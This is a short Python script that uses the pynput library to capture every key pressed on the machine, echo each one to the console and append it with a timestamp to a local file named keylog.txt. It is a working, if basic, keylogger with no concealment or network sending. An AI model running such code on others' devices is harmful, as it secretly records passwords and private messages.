from pynput import keyboard
from time import gmtime, strftime

LOG_FILE= "keylog.txt"
def save_to_file(data):
    with open(LOG_FILE, "a") as file:
        file.write(f'[{strftime("%Y-%m-%d %H:%M", gmtime())}] {data} \n')



def on_press(key):
    print(f"Typed: {key}")
    save_to_file(f"Typed: {key}")


with keyboard.Listener(
    on_press= on_press
) as listener:
    listener.join()



